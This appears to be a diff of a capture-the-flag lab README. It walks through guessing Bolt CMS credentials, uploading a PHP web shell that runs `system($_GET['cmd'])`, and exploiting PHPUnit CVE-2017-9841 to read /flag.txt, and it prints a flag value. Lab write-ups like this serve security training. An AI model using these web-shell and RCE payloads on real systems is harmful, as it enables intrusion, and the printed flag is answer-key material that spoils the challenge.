@@ -1,10 +1,10 @@
-# cyber-sec-labs
+# cybersec-labs
 # bolt
 Let's try: View Page Source, pay attantion to p This website is... /p, add /bolt to url and guess the user and pass.
 
 Once you are in you need to go to file management to see if you can upload some malicious files. Let’s try to create and upload vulnerable rce.html file
 
-click file and start editing <?php echo system($_GET['cmd']);?>
+click file and start editing < ?php echo system($_GET['cmd']);? >
 Go to options and rename the rce.html file to rce.php
 
 Click on rce.php
@@ -57,7 +57,7 @@ $ dirsearch -u URL
 From these addresses we can select the ones that are interesting to us like /composer.json, Here we can find version of php-unit and /eval-stding.php
 Vulnerable path. Let’s check: /composer.json where we can understand that our php uni is vulnerable (CVE-2017-9841).
 
-Now exploit the vulnerable path using Burpsuite: <?php system('cat /flag.txt')?>
+Now exploit the vulnerable path using Burpsuite: < ?php system('cat /flag.txt')? >
 CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
 # nodiff-backdoor
 After performing some recon using *dirsearch* on the targeted web application, we can find a *backup.zip* archive.
